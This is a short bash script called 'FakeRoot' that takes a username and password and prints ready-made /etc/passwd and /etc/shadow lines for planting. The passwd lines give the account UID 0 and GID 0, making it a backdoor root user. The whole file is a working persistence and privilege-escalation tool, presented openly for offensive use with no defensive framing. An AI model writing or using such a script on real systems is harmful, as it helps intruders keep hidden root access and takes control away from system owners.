#!/bin/bash



#Default intro
if [ $# -ne 2 ]; then
        echo "FakeRoot: Generate quick entries to plant in /etc/passwd or /etc/shadow";
        echo "Usage: $0 <username> <password>";
        exit 1;
fi


# Get args
username=$1;
password=$2;


# Create a SHA-512 hash of input password with random salt
hashed=$(/usr/bin/openssl passwd -6 $password);

epoch_time=$(date +%s);

shadow_entry="$username:$hashed:$epoch_time:0:99999:7:::";
passwd_entry="$username:x:0:0:root:/root:/bin/bash";
passwd_hash_entry="$username:$hashed:0:0:root:/root:/bin/bash";

echo "user:pass"
echo "$username:$password";
echo "For shadow file:"
echo "$shadow_entry";
echo "For passwd file:"
echo "$passwd_entry";
echo "Or... for hash in passwd file (less secure)"
echo "$passwd_hash_entry";
